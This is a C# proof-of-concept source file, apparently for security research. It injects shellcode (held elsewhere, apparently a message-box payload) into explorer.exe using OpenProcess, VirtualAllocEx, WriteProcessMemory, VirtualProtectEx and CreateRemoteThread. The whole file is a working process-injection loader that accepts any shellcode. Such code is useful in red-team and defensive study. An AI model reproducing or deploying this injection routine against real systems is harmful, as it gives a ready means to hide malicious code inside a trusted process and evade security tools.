using System;
using Win32ApiLibrary;

namespace CreateRemoteThreadPoC
{
    internal class PoC
    {
        internal static void PopMessageBox()
        {
            bool isWindows = Win32ApiHelpers.CheckValidOperatingSystem();
            if (!isWindows)
            {
                return;
            }

            byte[] shellcode;

            if (Environment.Is64BitProcess)
            {
                shellcode = Shellcode.x64;
            }
            else
            {
                shellcode = Shellcode.x32;
            }

            InjectCreateRemoteThread(shellcode);
        }

        private static void InjectCreateRemoteThread(byte[] data)
        {
            uint dataSize = (uint)data.Length;
            var targetPid = Win32ApiHelpers.GetProcessIdByName("explorer.exe");

            var procHandle = Win32Api.OpenProcess(
                Win32Api.ProcessAccessFlags.All,
                false,
                targetPid);

            var baseAddr = Win32Api.VirtualAllocEx(
                procHandle,
                IntPtr.Zero,
                dataSize,
                Win32Api.AllocationType.Commit,
                Win32Api.MemoryProtection.ReadWrite);

            Win32Api.WriteProcessMemory(
                procHandle,
                baseAddr,
                data,
                dataSize,
                out _);

            Win32Api.VirtualProtectEx(
                procHandle,
                baseAddr,
                dataSize,
                Win32Api.MemoryProtection.ExecuteRead,
                out _);

            var threadHandle = Win32Api.CreateRemoteThread(
                procHandle,
                IntPtr.Zero,
                0,
                baseAddr,
                IntPtr.Zero,
                0,
                out _);

            Win32Api.CloseHandle(procHandle);
            Win32Api.CloseHandle(threadHandle);
        }
    }
}
